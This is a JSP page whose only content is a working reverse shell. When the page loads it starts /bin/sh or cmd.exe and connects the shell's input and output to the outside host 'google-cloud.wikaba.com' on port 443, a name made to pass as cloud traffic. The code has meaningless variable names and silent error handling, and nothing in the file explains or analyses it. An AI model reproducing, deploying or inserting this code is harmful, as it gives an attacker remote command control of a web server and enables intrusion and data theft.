<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream dg;
    OutputStream sj;

    StreamConnector( InputStream dg, OutputStream sj )
    {
      this.dg = dg;
      this.sj = sj;
    }

    public void run()
    {
      BufferedReader aw  = null;
      BufferedWriter hmg = null;
      try
      {
        aw  = new BufferedReader( new InputStreamReader( this.dg ) );
        hmg = new BufferedWriter( new OutputStreamWriter( this.sj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = aw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hmg.write( buffer, 0, length );
          hmg.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( aw != null )
          aw.close();
        if( hmg != null )
          hmg.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "google-cloud.wikaba.com", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
